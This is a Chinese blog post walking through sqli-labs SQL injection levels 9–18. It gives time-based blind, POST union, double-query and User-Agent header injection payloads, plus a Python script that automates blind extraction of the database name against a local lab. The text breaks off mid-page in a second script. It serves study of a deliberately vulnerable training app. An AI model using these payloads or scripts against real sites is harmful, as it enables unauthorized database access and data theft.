<!DOCTYPE html><html class="theme-next mist use-motion" lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1"><meta name="theme-color" content="#222"><script src="/lib/pace/pace.min.js?v=1.0.2"></script><link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css"><link href="https://github.com/Lzy-wi/Lzy-wi.github.io/blob/master/fonts//css?family=Lato:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|logo:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css"><link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css"><link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4"><link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4"><link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4"><link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222"><meta name="keywords" content="注入,web,盲注,"><meta name="description" content="sqli-labs上的sql注入学习第二部分，上半部分（1-8）→sqli-labs的学习记录一"><meta name="keywords" content="注入,web,盲注"><meta property="og:type" content="article"><meta property="og:title" content="sqli-labs的学习记录二（9-22）"><meta property="og:url" content="http://yoursite.com/2018/08/03/sqli-labs2/index.html"><meta property="og:site_name" content="Lzy-wi&#39;Blog"><meta property="og:description" content="sqli-labs上的sql注入学习第二部分，上半部分（1-8）→sqli-labs的学习记录一"><meta property="og:locale" content="zh-Hans"><meta property="og:image" content="http://yoursite.com/img/2018-08-03/1.png"><meta property="og:image" content="http://yoursite.com/img/2018-08-03/2.png"><meta property="og:image" content="http://yoursite.com/img/2018-08-03/3.png"><meta property="og:image" content="http://yoursite.com/img/2018-08-03/4.png"><meta property="og:image" content="http://yoursite.com/img/2018-08-03/5.png"><meta property="og:image" content="http://yoursite.com/img/2018-08-03/6.png"><meta property="og:image" content="http://yoursite.com/img/2018-08-03/7.png"><meta property="og:image" content="http://yoursite.com/img/2018-08-03/8.png"><meta property="og:image" content="http://yoursite.com/img/2018-08-03/9.png"><meta property="og:image" content="http://yoursite.com/img/2018-08-03/10.png"><meta property="og:image" content="http://yoursite.com/img/2018-08-03/11.png"><meta property="og:image" content="http://yoursite.com/img/2018-08-03/12.png"><meta property="og:image" content="http://yoursite.com/img/2018-08-03/13.png"><meta property="og:image" content="http://yoursite.com/img/2018-08-03/14.png"><meta property="og:image" content="http://yoursite.com/img/2018-08-03/15.png"><meta property="og:image" content="http://yoursite.com/img/2018-08-03/17.png"><meta property="og:image" content="http://yoursite.com/img/2018-08-03/18.png"><meta property="og:image" content="http://yoursite.com/img/2018-08-03/19.png"><meta property="og:image" content="http://yoursite.com/img/2018-08-03/21.png"><meta property="og:updated_time" content="2018-08-22T02:57:48.766Z"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="sqli-labs的学习记录二（9-22）"><meta name="twitter:description" content="sqli-labs上的sql注入学习第二部分，上半部分（1-8）→sqli-labs的学习记录一"><meta name="twitter:image" content="http://yoursite.com/img/2018-08-03/1.png"><script type="text/javascript" id="hexo.configurations">var NexT=window.NexT||{},CONFIG={root:"/",scheme:"Mist",version:"5.1.4",sidebar:{position:"left",display:"hide",offset:12,b2t:!1,scrollpercent:!1,onmobile:!1},fancybox:!0,tabs:!0,motion:{enable:!0,async:!1,transition:{post_block:"fadeIn",post_header:"slideDownIn",post_body:"slideDownIn",coll_header:"slideLeftIn",sidebar:"slideUpIn"}},duoshuo:{userId:"0",author:"博主"},algolia:{applicationID:"",apiKey:"",indexName:"",hits:{per_page:10},labels:{input_placeholder:"Search for Posts",hits_empty:"We didn't find any results for the search: ${query}",hits_stats:"${hits} results found in ${time} ms"}}}</script><link rel="canonical" href="http://yoursite.com/2018/08/03/sqli-labs2/"><title>sqli-labs的学习记录二（9-22） | Lzy-wi'Blog</title></head><body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans"><div class="container sidebar-position-left page-post-detail"><div class="headband"></div> <a href="https://github.com/Lzy-wi" class="github-corner" aria-label="View source on Github"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513;color:#fff;position:absolute;top:0;border:0;right:0" aria-hidden="true"><path d="M0 0 115 115 130 115 142 142 250 250 250 0Z"></path><path d="M128.3 109C113.8 99.7 119 89.6 119 89.6 122 82.7 120.5 78.6 120.5 78.6 119.2 72 123.4 76.3 123.4 76.3 127.3 80.9 125.5 87.3 125.5 87.3 122.9 97.6 130.6 101.9 134.4 103.2" fill="currentColor" style="transform-origin:130px 106px" class="octo-arm"></path><path d="M115 115C114.9 115.1 118.7 116.5 119.8 115.4L133.7 101.6C136.9 99.2 139.9 98.4 142.2 98.6 133.8 88 127.5 74.4 143.8 58 148.5 53.4 154 51.2 159.7 51 160.3 49.4 163.2 43.6 171.4 40.1 171.4 40.1 176.1 42.5 178.8 56.2 183.1 58.6 187.2 61.8 190.9 65.4 194.5 69 197.7 73.2 200.1 77.6 213.8 80.2 216.3 84.9 216.3 84.9 212.7 93.1 206.9 96 205.4 96.6 205.1 102.4 203 107.8 198.3 112.5 181.9 128.9 168.3 122.5 157.7 114.1 157.9 116.9 156.7 120.9 152.7 124.9L141 136.5C139.8 137.7 141.6 141.9 141.8 141.8Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style><header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="header-inner"><div class="site-brand-wrapper"><div class="site-meta"><div class="top-scroll-bar"></div><div class="custom-logo-site-title"><a href="/" class="brand" rel="start"><span class="logo-line-before"><i></i></span> <span class="site-title">Lzy-wi'Blog</span><span class="logo-line-after"><i></i></span></a></div><p class="site-subtitle">这个人比较懒</p></div><div class="site-nav-toggle"> <button><span class="btn-bar"></span><span class="btn-bar"></span><span class="btn-bar"></span></button></div></div><nav class="site-nav"><ul id="menu" class="menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i><br> 首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i><br> 关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i><br> 标签</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i><br> 归档</a></li></ul></nav></div></header><main id="main" class="main"><div class="main-inner"><div class="content-wrap"><div id="content" class="content"><div id="posts" class="posts-expand"><article class="post post-type-normal" itemscope itemtype="http://schema.org/Article"><div class="post-block"><link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/03/sqli-labs2/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="name" content="Lzy-wi"><meta itemprop="description" content=""><meta itemprop="image" content="/img/touxiang/touxiang.jpg"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="Lzy-wi'Blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">sqli-labs的学习记录二（9-22）</h1><div class="post-meta"><span class="post-time"><span class="post-meta-item-icon"><i class="fa fa-calendar-o"></i></span> <span class="post-meta-item-text">发表于</span> <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-08-03T10:45:53+08:00">2018-08-03</time></span> <span class="post-comments-count"><span class="post-meta-divider">|</span><span class="post-meta-item-icon"><i class="fa fa-comment-o"></i></span><a href="/2018/08/03/sqli-labs2/#comments" itemprop="discussionUrl"><span class="post-comments-count gitment-comments-count" data-xid="/2018/08/03/sqli-labs2/" itemprop="commentsCount"></span></a></span></div></header><div class="post-body" itemprop="articleBody"><p>sqli-labs上的sql注入学习第二部分，上半部分（1-8）→<a href="https://lzy-wi.github.io/2018/07/20/sqli-labs1/" target="_blank" rel="noopener">sqli-labs的学习记录一</a><br><a id="more"></a></p><h5 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h5><p>&emsp;&emsp;布尔盲注是判断对错，第九关是基于时间的盲注，根据返回时间来判断。比如<code>(ascii(substr(database(),1,1))&gt;=97</code>,我们可以让这个判断语句正确延迟5秒返回，如果错误就正常返回。这里用到一个if函数，if（a,b,c）如果a正确就返回b，否则返回c。<br>所以最终payload为<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos; and if(ascii(substr(database(),1,1))&gt;=97,sleep(5),sleep(0)) -- +</span><br></pre></td></tr></table></figure><p></p><p>然后跟布尔盲注的方法一样一个一个的判断，时间上会比布尔盲注要多，要节省时间可以降低到2秒或者3秒,脚本基本上是抄第八关的，在判断方式上做了变动，思路不变。<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">txt1 = <span class="string">"http://localhost/sqli-labs/Less-9/?id=1' and if(ascii(substr(database(),"</span></span><br><span class="line">txt2 = <span class="string">",1))&gt;="</span></span><br><span class="line">txt3 = <span class="string">",1))="</span></span><br><span class="line">txt4 = <span class="string">",sleep(2),sleep(0)) -- +"</span></span><br><span class="line">num11 = <span class="number">97</span></span><br><span class="line">num12 = <span class="number">65</span></span><br><span class="line">num13 = <span class="number">48</span></span><br><span class="line">code = <span class="string">''</span></span><br><span class="line">num1 = <span class="number">0</span></span><br><span class="line">num2 = <span class="number">0</span></span><br><span class="line">num3 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">	url = txt1+str(i)+txt2+str(num11)+txt4</span><br><span class="line">	time1 = time.time()</span><br><span class="line">	req = requests.get(url = url)</span><br><span class="line">	time2 = time.time()</span><br><span class="line">	<span class="keyword">if</span>(time2 - time1 &gt;=<span class="number">2</span>):</span><br><span class="line">		num1 = <span class="number">1</span></span><br><span class="line">		</span><br><span class="line">	url = txt1+str(i)+txt2+str(num12)+txt4</span><br><span class="line">	time1 = time.time()</span><br><span class="line">	req = requests.get(url = url)</span><br><span class="line">	time2 = time.time()</span><br><span class="line">	<span class="keyword">if</span>(time2 - time1 &gt;=<span class="number">2</span>):</span><br><span class="line">		num2 = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">	url = txt1+str(i)+txt2+str(num13)+txt4</span><br><span class="line">	time1 = time.time()</span><br><span class="line">	req = requests.get(url = url)</span><br><span class="line">	time2 = time.time()</span><br><span class="line">	<span class="keyword">if</span>(time2 - time1 &gt;=<span class="number">2</span>):</span><br><span class="line">		num3 = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(num1 == <span class="number">1</span>):</span><br><span class="line">		num = <span class="number">97</span></span><br><span class="line">		num += <span class="number">13</span></span><br><span class="line">		url = txt1+str(i)+txt2+str(num)+txt4</span><br><span class="line">		time1 = time.time()</span><br><span class="line">		req = requests.get(url = url)</span><br><span class="line">		time2 = time.time()</span><br><span class="line">		<span class="keyword">if</span>(time2 - time1 &gt;=<span class="number">2</span>):</span><br><span class="line">			num += <span class="number">6</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			num -= <span class="number">7</span></span><br><span class="line">		url = txt1+str(i)+txt2+str(num)+txt4</span><br><span class="line">		time1 = time.time()</span><br><span class="line">		req = requests.get(url = url)</span><br><span class="line">		time2 = time.time()</span><br><span class="line">		<span class="keyword">if</span>(time2 - time1 &gt;=<span class="number">2</span>):</span><br><span class="line">			num += <span class="number">3</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			num -= <span class="number">3</span></span><br><span class="line">		url = txt1+str(i)+txt2+str(num)+txt4</span><br><span class="line">		time1 = time.time()</span><br><span class="line">		req = requests.get(url = url)</span><br><span class="line">		time2 = time.time()</span><br><span class="line">		<span class="keyword">if</span>(time2 - time1 &lt;=<span class="number">2</span>):</span><br><span class="line">			num -= <span class="number">3</span></span><br><span class="line">		<span class="keyword">if</span>((num == <span class="number">106</span>) <span class="keyword">or</span> (num == <span class="number">119</span>)):</span><br><span class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> range(num,num+<span class="number">4</span>):</span><br><span class="line">				url = txt1+str(i)+txt3+str(j)+txt4</span><br><span class="line">				time1 = time.time()</span><br><span class="line">				req = requests.get(url = url)</span><br><span class="line">				time2 = time.time()</span><br><span class="line">				<span class="keyword">if</span>(time2 - time1 &gt;=<span class="number">2</span>):</span><br><span class="line">					code += chr(j)</span><br><span class="line">					<span class="keyword">print</span> code</span><br><span class="line">					num1 = <span class="number">0</span></span><br><span class="line">					num2 = <span class="number">0</span></span><br><span class="line">					num3 = <span class="number">0</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> range(num,num+<span class="number">3</span>):</span><br><span class="line">				url = txt1+str(i)+txt3+str(j)+txt4</span><br><span class="line">				time1 = time.time()</span><br><span class="line">				req = requests.get(url = url)</span><br><span class="line">				time2 = time.time()</span><br><span class="line">				<span class="keyword">if</span>(time2 - time1 &gt;=<span class="number">2</span>):</span><br><span class="line">					code += chr(j)</span><br><span class="line">					<span class="keyword">print</span> code</span><br><span class="line">					num1 = <span class="number">0</span></span><br><span class="line">					num2 = <span class="number">0</span></span><br><span class="line">					num3 = <span class="number">0</span></span><br><span class="line">	<span class="keyword">if</span>(num1 == <span class="number">0</span> <span class="keyword">and</span> num2 == <span class="number">1</span>):</span><br><span class="line">		num = <span class="number">65</span></span><br><span class="line">		num += <span class="number">13</span></span><br><span class="line">		url = txt1+str(i)+txt2+str(num)+txt4</span><br><span class="line">		time1 = time.time()</span><br><span class="line">		req = requests.get(url = url)</span><br><span class="line">		time2 = time.time()</span><br><span class="line">		<span class="keyword">if</span>(time2 - time1 &gt;=<span class="number">2</span>):</span><br><span class="line">			num += <span class="number">6</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			num -= <span class="number">7</span></span><br><span class="line">		url = txt1+str(i)+txt2+str(num)+txt4</span><br><span class="line">		time1 = time.time()</span><br><span class="line">		req = requests.get(url = url)</span><br><span class="line">		time2 = time.time()</span><br><span class="line">		<span class="keyword">if</span>(time2 - time1 &gt;=<span class="number">2</span>):</span><br><span class="line">			num += <span class="number">3</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			num -= <span class="number">3</span></span><br><span class="line">		url = txt1+str(i)+txt2+str(num)+txt4</span><br><span class="line">		time1 = time.time()</span><br><span class="line">		req = requests.get(url = url)</span><br><span class="line">		time2 = time.time()</span><br><span class="line">		<span class="keyword">if</span>(time2 - time1 &lt;=<span class="number">2</span>):</span><br><span class="line">			num -= <span class="number">3</span></span><br><span class="line">		<span class="keyword">if</span>((num == <span class="number">74</span>) <span class="keyword">or</span> (num == <span class="number">87</span>)):</span><br><span class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> range(num,num+<span class="number">4</span>):</span><br><span class="line">				url = txt1+str(i)+txt3+str(j)+txt4</span><br><span class="line">				time1 = time.time()</span><br><span class="line">				req = requests.get(url = url)</span><br><span class="line">				time2 = time.time()</span><br><span class="line">				<span class="keyword">if</span>(time2 - time1 &gt;=<span class="number">2</span>):</span><br><span class="line">					code += chr(j)</span><br><span class="line">					<span class="keyword">print</span> code</span><br><span class="line">					num1 = <span class="number">0</span></span><br><span class="line">					num2 = <span class="number">0</span></span><br><span class="line">					num3 = <span class="number">0</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> range(num,num+<span class="number">3</span>):</span><br><span class="line">				url = txt1+str(i)+txt3+str(j)+txt4</span><br><span class="line">				time1 = time.time()</span><br><span class="line">				req = requests.get(url = url)</span><br><span class="line">				time2 = time.time()</span><br><span class="line">				<span class="keyword">if</span>(time2 - time1 &gt;=<span class="number">2</span>):</span><br><span class="line">					code += chr(j)</span><br><span class="line">					<span class="keyword">print</span> code</span><br><span class="line">					num1 = <span class="number">0</span></span><br><span class="line">					num2 = <span class="number">0</span></span><br><span class="line">					num3 = <span class="number">0</span></span><br><span class="line">	<span class="keyword">if</span>(num2 == <span class="number">0</span> <span class="keyword">and</span> num3 == <span class="number">1</span>):</span><br><span class="line">		num =<span class="number">48</span></span><br><span class="line">		num += <span class="number">5</span></span><br><span class="line">		url = txt1+str(i)+txt2+str(num)+txt4</span><br><span class="line">		time1 = time.time()</span><br><span class="line">		req = requests.get(url = url)</span><br><span class="line">		time2 = time.time()</span><br><span class="line">		<span class="keyword">if</span>(time2 - time1 &gt;=<span class="number">2</span>):</span><br><span class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> range(num,num+<span class="number">5</span>):</span><br><span class="line">				url = txt1+str(i)+txt3+str(j)+txt4</span><br><span class="line">				time1 = time.time()</span><br><span class="line">				req = requests.get(url = url)</span><br><span class="line">				time2 = time.time()</span><br><span class="line">				<span class="keyword">if</span>(time2 - time1 &gt;=<span class="number">2</span>):</span><br><span class="line">					code += chr(j)</span><br><span class="line">					<span class="keyword">print</span> code</span><br><span class="line">					num1 = <span class="number">0</span></span><br><span class="line">					num2 = <span class="number">0</span></span><br><span class="line">					num3 = <span class="number">0</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			num -= <span class="number">5</span></span><br><span class="line">			<span class="keyword">for</span> j <span class="keyword">in</span> range(num,num+<span class="number">5</span>):</span><br><span class="line">				url = txt1+str(i)+txt3+str(j)+txt4</span><br><span class="line">				time1 = time.time()</span><br><span class="line">				req = requests.get(url = url)</span><br><span class="line">				time2 = time.time()</span><br><span class="line">				<span class="keyword">if</span>(time2 - time1 &gt;=<span class="number">2</span>):</span><br><span class="line">					code += chr(j)</span><br><span class="line">					<span class="keyword">print</span> code</span><br><span class="line">					num1 = <span class="number">0</span></span><br><span class="line">					num2 = <span class="number">0</span></span><br><span class="line">					num3 = <span class="number">0</span></span><br></pre></td></tr></table></figure><p></p><p>附上截图<br><img src="/img/2018-08-03/1.png" alt="1"></p><h5 id="第十关"><a href="#第十关" class="headerlink" title="第十关"></a>第十关</h5><p>也是时间盲注，基于双引号，把单引号变成双引号即可<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&quot; and if(ascii(substr(database(),1,1))&gt;=97,sleep(5),sleep(0)) -- +</span><br></pre></td></tr></table></figure><p></p><h5 id="第十一关"><a href="#第十一关" class="headerlink" title="第十一关"></a>第十一关</h5><p>第十一关是基于单引号的post型注入，在f12下可以看到表单是post型以及两个参数<code>uname</code>和<code>passwd</code><br><img src="/img/2018-08-03/2.png" alt="2"><br>post型注入要勾选上post data，最后不要忘记<code>submit=Submit</code><br><img src="/img/2018-08-03/3.png" alt="3"><br>&emsp;&emsp;我在测试时发现我的火狐浏览器的hackbar在post方式下单引号测试excute点击没反应，（对于这个bug真的很迷，也有师兄曾经遇到过），无奈只能切换工具，chrome下的postman，效果也不怎么好，直接换了旧版本的火狐（56.0）<br>继续，在passwd后加个单引号直接报错，后面就跟第一关一样了，post表单payload如下<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=123&amp;passwd=123&apos; union select 1,database() -- +&amp;submit=Submit</span><br></pre></td></tr></table></figure><p></p><p><img src="/img/2018-08-03/4.png" alt="4"></p><h5 id="第十二关"><a href="#第十二关" class="headerlink" title="第十二关"></a>第十二关</h5><p>基于双引号的post型注入，跟第十一关一样，单引号替换双引号，测试发现报错，少了括号，payload如下<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=123&amp;passwd=456&quot;) union select 1,database() -- + &amp;submit=Submit</span><br></pre></td></tr></table></figure><p></p><p><img src="/img/2018-08-03/5.png" alt="5"></p><h5 id="第十三关"><a href="#第十三关" class="headerlink" title="第十三关"></a>第十三关</h5><p>post型基于单引号的双注入，第五关讲过，直接拿第五关的payload<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=123&amp;passwd=123&apos;) union select count(*),concat_ws(&apos;:&apos;,(select database()),floor(rand()*2)) as a from information_schema.tables group by a-- + &amp;submit=Submit</span><br></pre></td></tr></table></figure><p></p><p>一次没成功就多试几次<br><img src="/img/2018-08-03/6.png" alt="6"></p><h5 id="第十四关"><a href="#第十四关" class="headerlink" title="第十四关"></a>第十四关</h5><p>post型基于双引号的双注入，跟第十三关一样，payload如下<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=123&amp;passwd=123&quot; union select count(*),concat_ws(&apos;:&apos;,(select database()),floor(rand()*2)) as a from information_schema.tables group by a-- + &amp;submit=Submit</span><br></pre></td></tr></table></figure><p></p><p><img src="/img/2018-08-03/7.png" alt="7"></p><h5 id="第十五关"><a href="#第十五关" class="headerlink" title="第十五关"></a>第十五关</h5><p>post型单引号盲注，测试布尔型<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=123&amp;passwd=123&apos; or &apos;1&apos;=&apos;1 &amp;submit=Submit</span><br></pre></td></tr></table></figure><p></p><p><img src="/img/2018-08-03/8.png" alt="8"><br>测试时间型失败，返回时间异常，经常是几分钟才有有回复，测试失败</p><h5 id="第十六关"><a href="#第十六关" class="headerlink" title="第十六关"></a>第十六关</h5><p>post型双引号盲注和第十五关一样<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=123&amp;passwd=123&quot;) or &quot;1&quot;=&quot;1&quot; -- + &amp;submit=Submit</span><br></pre></td></tr></table></figure><p></p><p><img src="/img/2018-08-03/9.png" alt="9"></p><h5 id="第十七关"><a href="#第十七关" class="headerlink" title="第十七关"></a>第十七关</h5><p>基于错误的更新查询post注入<br><strong>高版本的mysql已经修复了这个bug</strong><br>有兴趣的可以去了解下<br>–&gt;<a href="https://blog.csdn.net/Fly_hps/article/details/79416842" target="_blank" rel="noopener">传送门</a><br>–&gt;<a href="https://blog.csdn.net/u012763794/article/details/51361152" target="_blank" rel="noopener">传送门</a><br>–&gt;<a href="https://www.cnblogs.com/xishaonian/p/6243497.html" target="_blank" rel="noopener">传送门</a></p><h5 id="第十八关"><a href="#第十八关" class="headerlink" title="第十八关"></a>第十八关</h5><p>请求头User-Agent注入（需要正确的用户名和密码），需要抓包，抓包工具burpsuit（不会使用的自行百度）<br>先抓包<br><img src="/img/2018-08-03/10.png" alt="10"><br>在User-Agent后面加一个单引号<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0&apos;</span><br></pre></td></tr></table></figure><p></p><p>发现报错，说明可以注入<br><img src="/img/2018-08-03/11.png" alt="11"><br>一般这种注入的sql语句都是insert类型，查看index.php的查询关键代码<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$insert=&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&apos;$uagent&apos;, &apos;$IP&apos;, $uname)&quot;;</span><br></pre></td></tr></table></figure><p></p><p>因为这种方式注入没有回显，一般是基于时间的insert型盲注，通过判断返回时间来注入<br><em>user-agent简写成Mozilla/5.0 Firefox/56.0</em><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 Firefox/56.0&apos; or sleep(5) or &apos;</span><br></pre></td></tr></table></figure><p></p><p>最后要闭合单引号，不可以注释掉（我也不知道原因π_π）<br>5秒后返回正常页面<br><img src="/img/2018-08-03/12.png" alt="12"><br>猜测数据库<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Mozilla/5.0 Firefox/56.0&apos; or if(ascii(substr((select database()),1,1))&gt;97,sleep(5),sleep(0)) or &apos;</span><br></pre></td></tr></table></figure><p></p><p>5秒后返回<br><img src="/img/2018-08-03/13.png" alt="13"><br>盲注当然是写脚本跑啦,python脚本代码如下，稍微修改了一下之前的代码就可以了<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span 